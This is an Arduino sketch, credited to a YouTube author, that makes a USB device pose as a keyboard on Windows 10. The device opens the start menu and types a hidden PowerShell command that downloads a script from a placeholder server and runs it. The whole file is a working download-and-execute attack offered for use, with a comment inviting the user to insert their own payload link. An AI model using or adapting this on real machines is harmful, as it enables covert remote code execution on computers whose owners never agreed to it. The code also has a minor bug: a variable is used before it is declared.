/*
 *  Powershell Download And Execute for Windows 10 by Darren Rainey 
 *  http://youtube.com/DarrenRainey
 *  This script will open the start menu, Download a script from a external source and
 *  Run it in the background without using the RUN dialog which may be blocked in some places.
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  pinMode(ledPin, OUTPUT);
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);
  
  // Wait 12 Seconds
  delay(12000);

  typeKey(KEY_LEFT_GUI);

  delay(500);
  // Replace YOURSERVER?YOURSCRIPT with a link to your script file to download and execute
  Keyboard.print("powershell.exe -windowstyle hidden iex (new-object net.webclient).downloadstring('YOURSERVER/YOUR-SCRIPT')");
  delay(500);
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {
int ledPin = 2;
digitalWrite(ledPin, HIGH);
}
